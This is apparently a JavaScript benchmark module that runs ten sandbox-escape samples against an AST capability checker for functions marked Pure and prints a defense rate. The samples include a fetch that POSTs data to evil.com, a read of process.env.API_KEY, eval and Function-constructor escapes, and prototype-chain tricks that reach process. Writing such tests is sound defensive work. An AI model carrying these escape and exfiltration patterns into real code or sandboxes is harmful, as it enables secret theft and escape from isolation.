// Adversarial Effect & Capability Escape Benchmark
// Tests 10 malicious escape attempts against *(Pure) functions

import { AstCapabilityChecker } from '../runtime/ast_capability_checker.mjs';

export const ADVERSARIAL_ATTACK_VECTORS = [
  {
    id: "ATTACK_01_DIRECT_PROCESS",
    name: "Direct process.env Access",
    fn: { name: "leakSecret", effect: "Pure", params: [], body: "return process.env.API_KEY;" }
  },
  {
    id: "ATTACK_02_DIRECT_FETCH",
    name: "Direct fetch() I/O Call",
    fn: { name: "exfiltrate", effect: "Pure", params: ["data"], body: "fetch('https://evil.com', {method:'POST', body:data}); return true;" }
  },
  {
    id: "ATTACK_03_DIRECT_EVAL",
    name: "Direct eval() String Execution",
    fn: { name: "runUnsafe", effect: "Pure", params: ["code"], body: "return eval(code);" }
  },
  {
    id: "ATTACK_04_DIRECT_FUNCTION_CTOR",
    name: "Direct Function() Constructor",
    fn: { name: "makeFn", effect: "Pure", params: [], body: "const f = new Function('return 42'); return f();" }
  },
  {
    id: "ATTACK_05_DYNAMIC_INDEX_GLOBALTHIS",
    name: "Computed globalThis['process'] Access",
    fn: { name: "getProcDynamic", effect: "Pure", params: [], body: "const p = globalThis['process']; return p.version;" }
  },
  {
    id: "ATTACK_06_DYNAMIC_INDEX_WINDOW_FETCH",
    name: "Computed window['fetch'] Access",
    fn: { name: "getFetchDynamic", effect: "Pure", params: [], body: "const net = window['fetch']; return net;" }
  },
  {
    id: "ATTACK_07_PROTOTYPE_CONSTRUCTOR_CHAIN",
    name: "Prototype Chain Constructor Escalation",
    fn: { name: "escapeViaCtor", effect: "Pure", params: [], body: "return (()=>{}).constructor.constructor('return process')();" }
  },
  {
    id: "ATTACK_08_STRING_PROTOTYPE_ESCALATION",
    name: "String Prototype Constructor Escalation",
    fn: { name: "stringCtorEscape", effect: "Pure", params: [], body: "return ''.constructor.constructor('return 1')();" }
  },
  {
    id: "ATTACK_09_REFLECT_GET_ESCAPE",
    name: "Meta-Programming Reflect.get() Host Escape",
    fn: { name: "reflectEscape", effect: "Pure", params: [], body: "return Reflect.get(globalThis, 'process');" }
  },
  {
    id: "ATTACK_10_INDIRECT_EVAL_ESCAPE",
    name: "Indirect (0, eval) Comma Operator Escape",
    fn: { name: "indirectEval", effect: "Pure", params: ["str"], body: "return (0, eval)(str);" }
  }
];

export function runAdversarialEffectSuite() {
  console.log("================================================================================");
  console.log("   ADVERSARIAL EFFECT & CAPABILITY CHECKER AUDIT (10 ATTACK VECTORS)           ");
  console.log("================================================================================");

  let blockedCount = 0;
  const auditResults = [];

  for (const attack of ADVERSARIAL_ATTACK_VECTORS) {
    const res = AstCapabilityChecker.auditFunctionSemantics(attack.fn);
    const blocked = !res.valid;
    if (blocked) blockedCount++;

    const statusStr = blocked ? "BLOCKED (PASS)" : "ALLOWED (VULNERABLE)";
    console.log(`  [${attack.id}] ${attack.name.padEnd(42)} -> ${statusStr}`);
    auditResults.push({
      id: attack.id,
      name: attack.name,
      blocked,
      violations: res.violations
    });
  }

  const passRate = (blockedCount / ADVERSARIAL_ATTACK_VECTORS.length) * 100;
  console.log("--------------------------------------------------------------------------------");
  console.log(`>>> Adversarial Defense Rate: ${passRate.toFixed(1)}% (${blockedCount}/${ADVERSARIAL_ATTACK_VECTORS.length} Vectors Intercepted)`);
  console.log("================================================================================");

  return {
    total_vectors: ADVERSARIAL_ATTACK_VECTORS.length,
    blocked_count: blockedCount,
    defense_rate_percent: passRate,
    attacks: auditResults
  };
}
